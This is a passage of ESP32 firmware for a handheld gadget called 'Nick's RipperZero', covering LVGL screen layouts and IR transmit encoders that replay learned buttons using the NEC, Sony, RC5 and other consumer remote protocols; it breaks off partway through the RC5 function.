// CREATE KNOWN DEVICES SCREEN
// ============================================================

void create_known_screen() {

  rf_known_screen =
    lv_obj_create(NULL);


  lv_obj_set_style_bg_color(
    rf_known_screen,
    lv_color_hex(COLOR_BG),
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_opa(
    rf_known_screen,
    LV_OPA_COVER,
    LV_PART_MAIN
  );

  create_cyber_background(rf_known_screen, true);


  create_header(
    rf_known_screen,
    "LEARN REMOTE"
  );


  lv_obj_t *info =
    lv_label_create(
      rf_known_screen
    );


  lv_label_set_text(
    info,
    "Choose a guided device, or OTHER\nto name every learned button yourself."
  );


  lv_obj_set_style_text_color(
    info,
    lv_color_hex(COLOR_MUTED),
    LV_PART_MAIN
  );


  lv_obj_set_style_text_font(
    info,
    &lv_font_montserrat_12,
    LV_PART_MAIN
  );


  lv_obj_set_style_text_align(
    info,
    LV_TEXT_ALIGN_CENTER,
    LV_PART_MAIN
  );


  lv_obj_align(
    info,
    LV_ALIGN_TOP_MID,
    0,
    125
  );


  create_button(
    rf_known_screen,
    50,
    215,
    220,
    58,
    "SELECT DEVICE",
    COLOR_GREEN,
    open_device_types
  );


  create_button(
    rf_known_screen,
    50,
    290,
    220,
    48,
    "BACK TO RF MENU",
    COLOR_RF,
    open_rf
  );


  create_footer(
    rf_known_screen
  );
}


// ============================================================
// CREATE HOME SCREEN
// ============================================================

void create_home_background(lv_obj_t *parent) {
  // Kept intentionally subtle so the existing cards and labels remain legible.
  for (int y = 12; y < LCD_VER_RES; y += 48) {
    lv_obj_t *line = lv_obj_create(parent);
    lv_obj_set_size(line, LCD_HOR_RES, 1);
    lv_obj_set_pos(line, 0, y);
    lv_obj_set_style_pad_all(line, 0, LV_PART_MAIN);
    lv_obj_set_style_border_width(line, 0, LV_PART_MAIN);
    lv_obj_set_style_radius(line, 0, LV_PART_MAIN);
    lv_obj_set_style_bg_color(line, lv_color_hex(y % 96 == 12 ? COLOR_RF : 0x005C62), LV_PART_MAIN);
    lv_obj_set_style_bg_opa(line, LV_OPA_20, LV_PART_MAIN);
  }

  for (int x = 16; x < LCD_HOR_RES; x += 48) {
    lv_obj_t *line = lv_obj_create(parent);
    lv_obj_set_size(line, 1, LCD_VER_RES);
    lv_obj_set_pos(line, x, 0);
    lv_obj_set_style_pad_all(line, 0, LV_PART_MAIN);
    lv_obj_set_style_border_width(line, 0, LV_PART_MAIN);
    lv_obj_set_style_radius(line, 0, LV_PART_MAIN);
    lv_obj_set_style_bg_color(line, lv_color_hex(x % 96 == 16 ? 0x00B3A4 : 0x005C62), LV_PART_MAIN);
    lv_obj_set_style_bg_opa(line, LV_OPA_20, LV_PART_MAIN);
  }

  // Sparse honeycomb outlines add texture while keeping the screen mostly black.
  for (int row = 0; row < 4; row++) {
    for (int column = 0; column < 4; column++) {
      int center_x = 42 + column * 78 + (row % 2 ? 39 : 0);
      int center_y = 82 + row * 82;
      int radius = 24;
      lv_point_t *points = (lv_point_t *)lv_mem_alloc(7 * sizeof(lv_point_t));
      if (points == NULL) {
        continue;
      }

      points[0] = { (lv_coord_t)(center_x - radius / 2), (lv_coord_t)(center_y - radius) };
      points[1] = { (lv_coord_t)(center_x + radius / 2), (lv_coord_t)(center_y - radius) };
      points[2] = { (lv_coord_t)(center_x + radius), (lv_coord_t)center_y };
      points[3] = { (lv_coord_t)(center_x + radius / 2), (lv_coord_t)(center_y + radius) };
      points[4] = { (lv_coord_t)(center_x - radius / 2), (lv_coord_t)(center_y + radius) };
      points[5] = { (lv_coord_t)(center_x - radius), (lv_coord_t)center_y };
      points[6] = points[0];

      lv_obj_t *hex = lv_line_create(parent);
      lv_line_set_points(hex, points, 7);
      lv_obj_set_style_line_width(hex, 1, LV_PART_MAIN);
      lv_obj_set_style_line_color(hex, lv_color_hex((row + column) % 2 ? 0x006B70 : 0x009E99), LV_PART_MAIN);
      lv_obj_set_style_line_opa(hex, LV_OPA_20, LV_PART_MAIN);
    }
  }
}


lv_obj_t *create_dashboard_tile(lv_obj_t *parent, int x, int y, int width, int height,
                                const char *badge, const char *title, const char *subtitle,
                                uint32_t accent_color, lv_event_cb_t event_cb) {
  lv_obj_t *tile = lv_btn_create(parent);
  lv_obj_set_size(tile, width, height);
  lv_obj_set_pos(tile, x, y);
  lv_obj_set_style_pad_all(tile, 0, LV_PART_MAIN);
  lv_obj_set_style_bg_color(tile, lv_color_hex(COLOR_PANEL), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(tile, LV_OPA_90, LV_PART_MAIN);
  lv_obj_set_style_border_width(tile, 1, LV_PART_MAIN);
  lv_obj_set_style_border_color(tile, lv_color_hex(COLOR_BORDER), LV_PART_MAIN);
  lv_obj_set_style_radius(tile, 12, LV_PART_MAIN);
  lv_obj_set_style_shadow_width(tile, 8, LV_PART_MAIN);
  lv_obj_set_style_shadow_color(tile, lv_color_hex(COLOR_SHADOW), LV_PART_MAIN);
  lv_obj_set_style_shadow_opa(tile, LV_OPA_20, LV_PART_MAIN);
  lv_obj_set_style_bg_color(tile, lv_color_hex(COLOR_PANEL2), LV_STATE_PRESSED);
  lv_obj_set_style_border_color(tile, lv_color_hex(accent_color), LV_STATE_PRESSED);
  lv_obj_add_event_cb(tile, event_cb, LV_EVENT_CLICKED, NULL);

  lv_obj_t *accent = lv_obj_create(tile);
  lv_obj_set_size(accent, 3, height - 20);
  lv_obj_set_pos(accent, 7, 10);
  lv_obj_set_style_bg_color(accent, lv_color_hex(accent_color), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(accent, LV_OPA_70, LV_PART_MAIN);
  lv_obj_set_style_border_width(accent, 0, LV_PART_MAIN);
  lv_obj_set_style_radius(accent, LV_RADIUS_CIRCLE, LV_PART_MAIN);
  lv_obj_clear_flag(accent, LV_OBJ_FLAG_SCROLLABLE);
  lv_obj_clear_flag(accent, LV_OBJ_FLAG_CLICKABLE);

  lv_obj_t *badge_panel = lv_obj_create(tile);
  lv_obj_set_size(badge_panel, 34, 34);
  lv_obj_set_pos(badge_panel, 18, 14);
  lv_obj_set_style_bg_color(badge_panel, lv_color_hex(accent_color), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(badge_panel, LV_OPA_20, LV_PART_MAIN);
  lv_obj_set_style_border_width(badge_panel, 1, LV_PART_MAIN);
  lv_obj_set_style_border_color(badge_panel, lv_color_hex(accent_color), LV_PART_MAIN);
  lv_obj_set_style_border_opa(badge_panel, LV_OPA_50, LV_PART_MAIN);
  lv_obj_set_style_radius(badge_panel, 9, LV_PART_MAIN);
  lv_obj_clear_flag(badge_panel, LV_OBJ_FLAG_SCROLLABLE);
  lv_obj_clear_flag(badge_panel, LV_OBJ_FLAG_CLICKABLE);
  if (strcmp(badge, "CLOCK_FACE") == 0) {
    // LVGL's bundled symbol set has no clock glyph. Draw a crisp clock face
    // from native objects instead of substituting the misleading refresh icon.
    lv_obj_t *clock_face = lv_obj_create(badge_panel);
    lv_obj_set_size(clock_face, 20, 20);
    lv_obj_center(clock_face);
    lv_obj_set_style_bg_opa(clock_face, LV_OPA_TRANSP, LV_PART_MAIN);
    lv_obj_set_style_border_width(clock_face, 2, LV_PART_MAIN);
    lv_obj_set_style_border_color(clock_face, lv_color_hex(accent_color), LV_PART_MAIN);
    lv_obj_set_style_radius(clock_face, LV_RADIUS_CIRCLE, LV_PART_MAIN);
    lv_obj_set_style_pad_all(clock_face, 0, LV_PART_MAIN);
    lv_obj_clear_flag(clock_face, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_clear_flag(clock_face, LV_OBJ_FLAG_CLICKABLE);

    lv_obj_t *minute_hand = lv_obj_create(clock_face);
    lv_obj_set_size(minute_hand, 2, 7);
    lv_obj_align(minute_hand, LV_ALIGN_CENTER, 0, -3);
    lv_obj_set_style_bg_color(minute_hand, lv_color_hex(accent_color), LV_PART_MAIN);
    lv_obj_set_style_border_width(minute_hand, 0, LV_PART_MAIN);
    lv_obj_set_style_radius(minute_hand, LV_RADIUS_CIRCLE, LV_PART_MAIN);
    lv_obj_clear_flag(minute_hand, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_clear_flag(minute_hand, LV_OBJ_FLAG_CLICKABLE);

    lv_obj_t *hour_hand = lv_obj_create(clock_face);
    lv_obj_set_size(hour_hand, 6, 2);
    lv_obj_align(hour_hand, LV_ALIGN_CENTER, 2, 0);
    lv_obj_set_style_bg_color(hour_hand, lv_color_hex(accent_color), LV_PART_MAIN);
    lv_obj_set_style_border_width(hour_hand, 0, LV_PART_MAIN);
    lv_obj_set_style_radius(hour_hand, LV_RADIUS_CIRCLE, LV_PART_MAIN);
    lv_obj_clear_flag(hour_hand, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_clear_flag(hour_hand, LV_OBJ_FLAG_CLICKABLE);
  } else {
    lv_obj_t *badge_label = lv_label_create(badge_panel);
    lv_label_set_text(badge_label, badge);
    lv_obj_set_style_text_color(badge_label, lv_color_hex(accent_color), LV_PART_MAIN);
    lv_obj_set_style_text_font(badge_label, &lv_font_montserrat_16, LV_PART_MAIN);
    lv_obj_center(badge_label);
  }

  lv_obj_t *title_label = lv_label_create(tile);
  lv_label_set_text(title_label, title);
  lv_obj_set_width(title_label, width - 68);
  lv_label_set_long_mode(title_label, LV_LABEL_LONG_DOT);
  lv_obj_set_style_text_color(title_label, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
  // Compact two-column tiles only have 76 px beside the badge. The 12 px
  // face keeps names such as BLUETOOTH fully visible instead of ellipsizing.
  lv_obj_set_style_text_font(title_label,
                             width <= 150 ? &lv_font_montserrat_12 : &lv_font_montserrat_14,
                             LV_PART_MAIN);
  lv_obj_set_pos(title_label, 62, 11);

  lv_obj_t *subtitle_label = lv_label_create(tile);
  lv_label_set_text(subtitle_label, subtitle);
  lv_obj_set_width(subtitle_label, width - 68);
  // Give wrapped two-line descriptions enough vertical room on the shorter
  // Settings tiles. This prevents the second baseline from touching the tile
  // edge or being clipped by LVGL's label box.
  const int subtitle_y = height <= 66 ? 33 : 36;
  lv_obj_set_height(subtitle_label, max(18, height - subtitle_y - 3));
  lv_label_set_long_mode(subtitle_label, LV_LABEL_LONG_WRAP);
  lv_obj_set_style_text_color(subtitle_label, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  // Descriptions are supporting information. A true 10 px font keeps them
  // complete and separated while the 12/14 px titles retain visual priority.
  lv_obj_set_style_text_font(subtitle_label, &lv_font_montserrat_10, LV_PART_MAIN);
  lv_obj_set_style_text_line_space(subtitle_label, 2, LV_PART_MAIN);
  lv_obj_set_pos(subtitle_label, 62, subtitle_y);

  return tile;
}


// A low-opacity honeycomb/circuit layer shared by secondary pages. It uses a
// few large details rather than a dense grid so labels and touch targets stay
// clear on the 320x480 display.
void create_cyber_background(lv_obj_t *parent, bool show_radar) {
  // Full-screen artwork is created first so every label, button, and radar
  // element remains above it and fully touchable.
  lv_obj_t *background = lv_img_create(parent);
  lv_img_set_src(background, &hex_background_320x480);
  lv_obj_set_pos(background, 0, 0);
  // Artwork is intentionally subdued. It should frame controls, not compete
  // with their labels on the small LCD.
  lv_obj_set_style_img_opa(background, LV_OPA_30, LV_PART_MAIN);
  lv_obj_clear_flag(background, LV_OBJ_FLAG_CLICKABLE);

  const int hex_x[] = { 28, 266, 28, 266, 160 };
  const int hex_y[] = { 118, 118, 365, 365, 250 };

  for (uint8_t i = 0; i < 5; i++) {
    const int radius = i == 4 ? 30 : 22;
    lv_point_t *points = (lv_point_t *)lv_mem_alloc(7 * sizeof(lv_point_t));
    if (points == NULL) continue;

    points[0] = { (lv_coord_t)(hex_x[i] - radius / 2), (lv_coord_t)(hex_y[i] - radius) };
    points[1] = { (lv_coord_t)(hex_x[i] + radius / 2), (lv_coord_t)(hex_y[i] - radius) };
    points[2] = { (lv_coord_t)(hex_x[i] + radius), (lv_coord_t)hex_y[i] };
    points[3] = { (lv_coord_t)(hex_x[i] + radius / 2), (lv_coord_t)(hex_y[i] + radius) };
    points[4] = { (lv_coord_t)(hex_x[i] - radius / 2), (lv_coord_t)(hex_y[i] + radius) };
    points[5] = { (lv_coord_t)(hex_x[i] - radius), (lv_coord_t)hex_y[i] };
    points[6] = points[0];

    // Two layers suggest the soft glow from the selected hex-tech texture,
    // without storing a large bitmap in the device firmware.
    lv_obj_t *glow = lv_line_create(parent);
    lv_line_set_points(glow, points, 7);
    lv_obj_set_style_line_width(glow, 4, LV_PART_MAIN);
    lv_obj_set_style_line_color(glow, lv_color_hex(i % 2 ? 0x005C62 : 0x009E99), LV_PART_MAIN);
    lv_obj_set_style_line_opa(glow, LV_OPA_10, LV_PART_MAIN);

    lv_obj_t *hex = lv_line_create(parent);
    lv_line_set_points(hex, points, 7);
    lv_obj_set_style_line_width(hex, 1, LV_PART_MAIN);
    lv_obj_set_style_line_color(hex, lv_color_hex(i % 2 ? 0x00757A : 0x00B8B0), LV_PART_MAIN);
    lv_obj_set_style_line_opa(hex, LV_OPA_30, LV_PART_MAIN);
  }

  // Normal pages get a little more tiled texture. RF pages reserve this
  // visual space for their radar display instead.
  if (!show_radar) {
    const int tile_x[] = { 78, 160, 242, 119, 201, 78, 242 };
    const int tile_y[] = { 88, 88, 88, 170, 170, 334, 334 };
    for (uint8_t i = 0; i < 7; i++) {
      const int radius = 15;
      lv_point_t *points = (lv_point_t *)lv_mem_alloc(7 * sizeof(lv_point_t));
      if (points == NULL) continue;

      points[0] = { (lv_coord_t)(tile_x[i] - radius / 2), (lv_coord_t)(tile_y[i] - radius) };
      points[1] = { (lv_coord_t)(tile_x[i] + radius / 2), (lv_coord_t)(tile_y[i] - radius) };
      points[2] = { (lv_coord_t)(tile_x[i] + radius), (lv_coord_t)tile_y[i] };
      points[3] = { (lv_coord_t)(tile_x[i] + radius / 2), (lv_coord_t)(tile_y[i] + radius) };
      points[4] = { (lv_coord_t)(tile_x[i] - radius / 2), (lv_coord_t)(tile_y[i] + radius) };
      points[5] = { (lv_coord_t)(tile_x[i] - radius), (lv_coord_t)tile_y[i] };
      points[6] = points[0];

      lv_obj_t *tile = lv_line_create(parent);
      lv_line_set_points(tile, points, 7);
      lv_obj_set_style_line_width(tile, 1, LV_PART_MAIN);
      lv_obj_set_style_line_color(tile, lv_color_hex(i % 3 == 1 ? 0x006B70 : 0x009E99), LV_PART_MAIN);
      lv_obj_set_style_line_opa(tile, LV_OPA_20, LV_PART_MAIN);
    }
  }

  // Keep non-RF menus calm.  The circuit traces belong with the RF visualizer,
  // not behind normal buttons and labels.
  if (!show_radar) return;

  const lv_point_t circuit_paths[][3] = {
    { { 0, 92 }, { 66, 92 }, { 88, 114 } },
    { { 320, 338 }, { 258, 338 }, { 234, 362 } },
    { { 0, 402 }, { 76, 402 }, { 98, 380 } },
    { { 320, 175 }, { 248, 175 }, { 226, 153 } }
  };

  for (uint8_t i = 0; i < 4; i++) {
    lv_point_t *path = (lv_point_t *)lv_mem_alloc(3 * sizeof(lv_point_t));
    if (path == NULL) continue;
    memcpy(path, circuit_paths[i], 3 * sizeof(lv_point_t));
    lv_obj_t *trace = lv_line_create(parent);
    lv_line_set_points(trace, path, 3);
    lv_obj_set_style_line_width(trace, 1, LV_PART_MAIN);
    lv_obj_set_style_line_color(trace, lv_color_hex(i % 2 ? 0x006B70 : COLOR_RF), LV_PART_MAIN);
    lv_obj_set_style_line_opa(trace, LV_OPA_10, LV_PART_MAIN);
  }

  // RF pages get an understated radar target behind the content.
  const int radar_sizes[] = { 188, 128, 68 };
  for (uint8_t i = 0; i < 3; i++) {
    lv_obj_t *ring = lv_obj_create(parent);
    lv_obj_set_size(ring, radar_sizes[i], radar_sizes[i]);
    lv_obj_align(ring, LV_ALIGN_CENTER, 55, 6);
    lv_obj_set_style_bg_opa(ring, LV_OPA_TRANSP, LV_PART_MAIN);
    lv_obj_set_style_border_width(ring, 1, LV_PART_MAIN);
    lv_obj_set_style_border_color(ring, lv_color_hex(i == 1 ? 0x006B70 : COLOR_RF), LV_PART_MAIN);
    lv_obj_set_style_border_opa(ring, LV_OPA_20, LV_PART_MAIN);
    lv_obj_set_style_radius(ring, LV_RADIUS_CIRCLE, LV_PART_MAIN);
  }

  lv_obj_t *sweep = lv_obj_create(parent);
  lv_obj_set_size(sweep, 1, 104);
  lv_obj_align(sweep, LV_ALIGN_CENTER, 55, -47);
  lv_obj_set_style_bg_color(sweep, lv_color_hex(COLOR_RF), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(sweep, LV_OPA_20, LV_PART_MAIN);
  lv_obj_set_style_border_width(sweep, 0, LV_PART_MAIN);
}

void create_home_screen() {

  home_screen =
    lv_obj_create(NULL);


  lv_obj_set_style_bg_color(
    home_screen,
    lv_color_hex(COLOR_BG),
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_opa(
    home_screen,
    LV_OPA_COVER,
    LV_PART_MAIN
  );

  create_cyber_background(home_screen, false);


  create_header(
    home_screen,
    "Nick's RipperZero"
  );


  lv_obj_t *dashboard_kicker = lv_label_create(home_screen);
  lv_label_set_text(dashboard_kicker, "CONTROL CENTER   /   6 MODULES");
  lv_obj_set_width(dashboard_kicker, 292);
  lv_obj_set_style_text_align(dashboard_kicker, LV_TEXT_ALIGN_LEFT, LV_PART_MAIN);
  lv_obj_set_style_text_color(dashboard_kicker, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_style_text_font(dashboard_kicker, &lv_font_montserrat_12, LV_PART_MAIN);
  // The shared header owns y=66..84 for live status and battery text.
  // Dashboard content begins below that row so neither line can overlap.
  lv_obj_set_pos(dashboard_kicker, 16, 90);

  create_dashboard_tile(home_screen, 12, 108, 144, 74,
                        LV_SYMBOL_GPS, "RF TOOLS", "SCAN & ANALYZE", COLOR_RF, open_rf);
  create_dashboard_tile(home_screen, 164, 108, 144, 74,
                        LV_SYMBOL_EYE_OPEN, "IR CONTROL", "LEARN & SEND", COLOR_IR, open_ir);
  create_dashboard_tile(home_screen, 12, 190, 144, 74,
                        LV_SYMBOL_WIFI, "WI-FI", "NETWORK TOOLS", COLOR_GREEN, open_wifi);
  create_dashboard_tile(home_screen, 164, 190, 144, 74,
                        LV_SYMBOL_BLUETOOTH, "BLUETOOTH", "CONNECT & CONTROL", COLOR_BLUETOOTH, open_ble);
  create_dashboard_tile(home_screen, 12, 272, 144, 74,
                        LV_SYMBOL_SAVE, "SAVED", "CAPTURES & FILES", COLOR_SAVED, open_saved);
  create_dashboard_tile(home_screen, 164, 272, 144, 74,
                        LV_SYMBOL_SETTINGS, "SETTINGS", "DEVICE & SYSTEM", COLOR_SETTINGS, open_settings);

  home_clock_label = lv_label_create(home_screen);
  lv_obj_set_style_text_color(home_clock_label, lv_color_hex(COLOR_SETTINGS), LV_PART_MAIN);
  lv_obj_set_style_text_font(home_clock_label, &lv_font_montserrat_16, LV_PART_MAIN);
  lv_obj_set_style_text_align(home_clock_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(home_clock_label, LV_ALIGN_TOP_MID, 0, 366);
  refresh_home_clock();


  create_footer(
    home_screen
  );
}


// ============================================================
// SETUP
// ============================================================

// ============================================================
// IR REMOTE LEARNING / PLAYBACK
// ============================================================

void refresh_ir_saved_summary() {
  if (ir_saved_summary_label == NULL) return;

  if (saved_ir_remote_count == 0) {
    lv_label_set_text(ir_saved_summary_label,
                      "No saved IR remotes yet.\n\nCreate one, then learn each\nbutton from its original remote.");
    return;
  }

  if (selected_ir_saved_index < 0 || selected_ir_saved_index >= saved_ir_remote_count) {
    selected_ir_saved_index = 0;
  }

  char list_text[200] = "SAVED IR REMOTES\n";
  for (uint8_t i = 0; i < saved_ir_remote_count; i++) {
    char line[52];
    snprintf(line, sizeof(line), "%c %d. %s  (%d buttons)\n",
             i == selected_ir_saved_index ? '>' : ' ', i + 1,
             saved_ir_remotes[i].name, saved_ir_remotes[i].button_count);
    strncat(list_text, line, sizeof(list_text) - strlen(list_text) - 1);
  }
  lv_label_set_text(ir_saved_summary_label, list_text);
}


bool send_nec_rmt(uint32_t raw_data) {
  if (!ir_rmt_transmitter_ready) return false;

  // RMT runs at 1 MHz here, so each duration value is in microseconds.
  // NEC is LSB-first: 9 ms / 4.5 ms header, then 32 mark/space bits.
  rmt_data_t frame[34] = {};
  frame[0].level0 = HIGH;
  frame[0].duration0 = 9000;
  frame[0].level1 = LOW;
  frame[0].duration1 = 4500;
  for (uint8_t bit = 0; bit < 32; bit++) {
    rmt_data_t &symbol = frame[bit + 1];
    symbol.level0 = HIGH;
    symbol.duration0 = 560;
    symbol.level1 = LOW;
    symbol.duration1 = (raw_data & (1UL << bit)) ? 1690 : 560;
  }
  frame[33].level0 = HIGH;
  frame[33].duration0 = 560;
  frame[33].level1 = LOW;
  frame[33].duration1 = 10000;
  // A physical NEC remote sends a short burst rather than a lone frame. This
  // improves reliability for copied remotes, especially when the target is
  // several feet away, while the frames are close enough together to remain
  // one ordinary button press to the receiver.
  for (uint8_t repeat = 0; repeat < 2; repeat++) {
    if (!rmtWrite(IR_TRANSMITTER_PIN, frame, 34, 150) ||
        !rmtTransmitCompleted(IR_TRANSMITTER_PIN)) return false;
    if (repeat == 0) delay(40);
  }
  return true;
}


bool send_samsung_rmt(uint32_t raw_data) {
  if (!ir_rmt_transmitter_ready) return false;
  rmt_data_t frame[34] = {};
  frame[0].level0 = HIGH;
  frame[0].duration0 = 4500;
  frame[0].level1 = LOW;
  frame[0].duration1 = 4500;
  for (uint8_t bit = 0; bit < 32; bit++) {
    rmt_data_t &symbol = frame[bit + 1];
    symbol.level0 = HIGH;
    symbol.duration0 = 560;
    symbol.level1 = LOW;
    symbol.duration1 = (raw_data & (1UL << (31 - bit))) ? 1690 : 560;
  }
  frame[33].level0 = HIGH;
  frame[33].duration0 = 560;
  frame[33].level1 = LOW;
  frame[33].duration1 = 10000;
  for (uint8_t repeat = 0; repeat < 2; repeat++) {
    if (!rmtWrite(IR_TRANSMITTER_PIN, frame, 34, 150) ||
        !rmtTransmitCompleted(IR_TRANSMITTER_PIN)) return false;
    if (repeat == 0) delay(40);
  }
  return true;
}


bool send_sony_rmt(uint32_t raw_data, uint8_t bits) {
  if (!ir_rmt_transmitter_ready || bits == 0 || bits > 20) return false;
  rmt_data_t frame[22] = {};
  frame[0].level0 = HIGH;
  frame[0].duration0 = 2400;
  frame[0].level1 = LOW;
  frame[0].duration1 = 600;
  for (uint8_t bit = 0; bit < bits; bit++) {
    rmt_data_t &symbol = frame[bit + 1];
    symbol.level0 = HIGH;
    symbol.duration0 = 600;
    symbol.level1 = LOW;
    symbol.duration1 = (raw_data & (1UL << bit)) ? 1200 : 600;
  }
  frame[bits + 1].level0 = HIGH;
  frame[bits + 1].duration0 = 600;
  frame[bits + 1].level1 = LOW;
  frame[bits + 1].duration1 = 10000;
  // Sony SIRC remotes normally repeat the same command three times.
  for (uint8_t repeat = 0; repeat < 3; repeat++) {
    if (!rmtWrite(IR_TRANSMITTER_PIN, frame, bits + 2, 150) ||
        !rmtTransmitCompleted(IR_TRANSMITTER_PIN)) return false;
    if (repeat < 2) delay(45);
  }
  return true;
}


bool send_jvc_rmt(uint16_t raw_data) {
  if (!ir_rmt_transmitter_ready) return false;
  rmt_data_t frame[18] = {};
  frame[0].level0 = HIGH;
  frame[0].duration0 = 8400;
  frame[0].level1 = LOW;
  frame[0].duration1 = 4200;
  // The catalog form (for example C5E8 Power) is written MSB first.
  for (uint8_t bit = 0; bit < 16; bit++) {
    rmt_data_t &symbol = frame[bit + 1];
    symbol.level0 = HIGH;
    symbol.duration0 = 525;
    symbol.level1 = LOW;
    symbol.duration1 = (raw_data & (1U << (15 - bit))) ? 1575 : 525;
  }
  frame[17].level0 = HIGH;
  frame[17].duration0 = 525;
  frame[17].level1 = LOW;
  frame[17].duration1 = 10000;
  for (uint8_t repeat = 0; repeat < 2; repeat++) {
    if (!rmtWrite(IR_TRANSMITTER_PIN, frame, 18, 150) ||
        !rmtTransmitCompleted(IR_TRANSMITTER_PIN)) return false;
    if (repeat == 0) delay(45);
  }
  return true;
}


// Additional IR protocol support is implemented with the same ESP32-S3 RMT
// transmitter used by the proven NEC/Samsung/Sony/JVC paths above.  This keeps
// IRremote in receive/decode mode only, avoiding its LEDC send path, which was
// unstable with the display active on this board.
bool send_ir_pulse_distance_rmt(uint64_t raw_data, uint8_t bits, bool lsb_first,
                                uint16_t header_mark, uint16_t header_space,
                                uint16_t bit_mark, uint16_t one_space,
                                uint16_t zero_space, uint8_t frames,
                                uint16_t inter_frame_ms) {
  if (!ir_rmt_transmitter_ready || bits == 0 || bits > 64 || frames == 0) return false;

  rmt_data_t frame[66] = {};
  uint8_t symbols = 0;
  if (header_mark != 0 || header_space != 0) {
    frame[symbols].level0 = HIGH;
    frame[symbols].duration0 = header_mark;
    frame[symbols].level1 = LOW;
    frame[symbols].duration1 = header_space;
    symbols++;
  }
  for (uint8_t bit = 0; bit < bits; bit++) {
    const uint8_t source_bit = lsb_first ? bit : (bits - 1 - bit);
    const bool one = ((raw_data >> source_bit) & 1ULL) != 0;
    frame[symbols].level0 = HIGH;
    frame[symbols].duration0 = bit_mark;
    frame[symbols].level1 = LOW;
    frame[symbols].duration1 = one ? one_space : zero_space;
    symbols++;
  }
  // Pulse-distance protocols use a final mark. The following idle period is
  // intentionally long enough to separate individual button presses.
  frame[symbols].level0 = HIGH;
  frame[symbols].duration0 = bit_mark;
  frame[symbols].level1 = LOW;
  frame[symbols].duration1 = 10000;
  symbols++;

  for (uint8_t repeat = 0; repeat < frames; repeat++) {
    if (!rmtWrite(IR_TRANSMITTER_PIN, frame, symbols, 180) ||
        !rmtTransmitCompleted(IR_TRANSMITTER_PIN)) return false;
    if (repeat + 1 < frames && inter_frame_ms != 0) delay(inter_frame_ms);
  }
  return true;
}


struct IrRmtRun {
  uint16_t duration;
  uint8_t level;
};


bool append_ir_rmt_run(IrRmtRun *runs, uint8_t &count, uint8_t level, uint16_t duration) {
  if (duration == 0) return true;
  if (count > 0 && runs[count - 1].level == level) {
    const uint32_t combined = (uint32_t)runs[count - 1].duration + duration;
    if (combined > 32767U) return false;
    runs[count - 1].duration = (uint16_t)combined;
    return true;
  }
  if (count >= 96) return false;
  runs[count].level = level;
  runs[count].duration = duration;
  count++;
  return true;
}


bool send_ir_rmt_runs(const IrRmtRun *runs, uint8_t count) {
  if (!ir_rmt_transmitter_ready || count == 0 || count > 96) return false;

  rmt_data_t frame[48] = {};
  uint8_t symbols = 0;
  for (uint8_t run = 0; run < count; run += 2) {
    frame[symbols].level0 = runs[run].level;
    frame[symbols].duration0 = runs[run].duration;
    if (run + 1 < count) {
      frame[symbols].level1 = runs[run + 1].level;
      frame[symbols].duration1 = runs[run + 1].duration;
    } else {
      frame[symbols].level1 = LOW;
      frame[symbols].duration1 = 10000;
    }
    symbols++;
  }
  return rmtWrite(IR_TRANSMITTER_PIN, frame, symbols, 180) &&
         rmtTransmitCompleted(IR_TRANSMITTER_PIN);
}


bool send_lg_rmt(const SavedIrRemoteCommand &command) {
  uint32_t raw = (uint32_t)command.raw_data;
  if (raw == 0) {
    const uint16_t command_value = command.command;
    uint8_t checksum = 0;
    for (uint8_t nibble = 0; nibble < 4; nibble++) {
      checksum += (command_value >> (nibble * 4)) & 0x0F;
    }
    raw = ((uint32_t)(command.address & 0xFF) << 20) |
          ((uint32_t)command_value << 4) | (checksum & 0x0F);
  }
  return send_ir_pulse_distance_rmt(raw, 28, false,
                                    8416, 4208, 526, 1578, 550, 1, 0);
}


bool send_kaseikyo_rmt(const SavedIrRemoteCommand &command, uint16_t vendor_id) {
  if (vendor_id == 0) return false;
  const uint8_t vendor_parity =
    (uint8_t)((vendor_id ^ (vendor_id >> 8) ^ (vendor_id >> 4) ^ (vendor_id >> 12)) & 0x0F);
  const uint16_t address_field = ((command.address & 0x0FFF) << 4) | vendor_parity;
  const uint8_t command_byte = command.command & 0xFF;
  const uint8_t parity = command_byte ^ (address_field & 0xFF) ^ (address_field >> 8);
  const uint64_t raw = (uint64_t)vendor_id |
                       ((uint64_t)address_field << 16) |
                       ((uint64_t)command_byte << 32) |
                       ((uint64_t)parity << 40);
  return send_ir_pulse_distance_rmt(raw, 48, true,
                                    3456, 1728, 432, 1296, 432, 1, 0);
}


bool send_denon_or_sharp_rmt(const SavedIrRemoteCommand &command, bool sharp) {
  const uint16_t command_with_marker = (command.command & 0xFF) | (sharp ? 0x100 : 0x000);
  const uint16_t normal = (command.address & 0x1F) | (command_with_marker << 5);
  const uint16_t inverted = normal ^ 0x7FE0;
  if (!send_ir_pulse_distance_rmt(normal, 15, true,
                                   0, 0, 260, 1820, 780, 1, 0)) return false;
  delay(35);
  if (!send_ir_pulse_distance_rmt(inverted, 15, true,
                                   0, 0, 260, 1820, 780, 1, 0)) return false;
  delay(35);
  return send_ir_pulse_distance_rmt(normal, 15, true,
                                    0, 0, 260, 1820, 780, 1, 0);
}


bool ir_rc5_toggle = false;
bool ir_rc6_toggle = false;


bool send_rc5_rmt(const SavedIrRemoteCommand &command) {
  // RC5 contains a toggle bit. It changes for each new press so receivers can
  // distinguish repeated volume presses from one held button.
  ir_rc5_toggle = !ir_rc5_toggle;
  uint16_t data = (uint16_t)(command.address & 0x1F) << 6;
  uint8_t code = command.command & 0x7F;
  if (code >= 0x40) {
    code &= 0x3F;  // RC5X uses an inverted field bit for command bit 6.
  } else {
    data |= 1U << 12;
  }
  if (ir_rc5_toggle) data |= 1U << 11;
  data |= code;

  IrRmtRun runs[40] = {};
  uint8_t run_count = 0;
  // The virtual start bit and the 13 encoded data bits are MSB first.
  for (int8_t bit = 13; bit >= 0; bit--) {
    const bool one = bit == 13 || ((data >> bit) & 1U) != 0;
    if (one) {
      if (!append_ir_rmt_run(runs, run_count, LOW, 889) ||
